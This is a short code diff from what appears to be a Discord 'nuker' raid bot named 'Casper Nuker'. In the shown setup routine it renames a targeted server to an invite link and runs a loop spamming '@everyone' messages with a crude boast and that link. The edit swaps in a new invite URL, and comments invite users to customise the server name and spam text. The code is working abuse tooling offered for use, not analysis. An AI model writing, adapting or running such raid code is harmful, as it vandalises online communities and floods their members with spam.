@@ -41,7 +41,7 @@ async def setup(ctx):
         await ctx.send(f"Failed to update server profile picture: {e}")
 
     try:
-        await ctx.guild.edit(name=".gg/uT7nJ3H5")   # <-   change to what you want the server to be named
+        await ctx.guild.edit(name=".gg/WknjbqWQ3A")   # <-   change to what you want the server to be named
     except discord.HTTPException as e:
         await ctx.send(f"Failed to update server name: {e}")
 
@@ -94,7 +94,7 @@ async def setup(ctx):
             async def spam_channel(channel):
                 while spamming:
                     try:
-                        await channel.send('@everyone Casper Nuker fucked this server!')  # <- change your message you want to spam
+                        await channel.send('@everyone Casper Nuker fucked this server! https://discord.gg/WknjbqWQ3A')  # <- change your message you want to spam
                     except discord.Forbidden:
                         break
                     except discord.HTTPException as e:
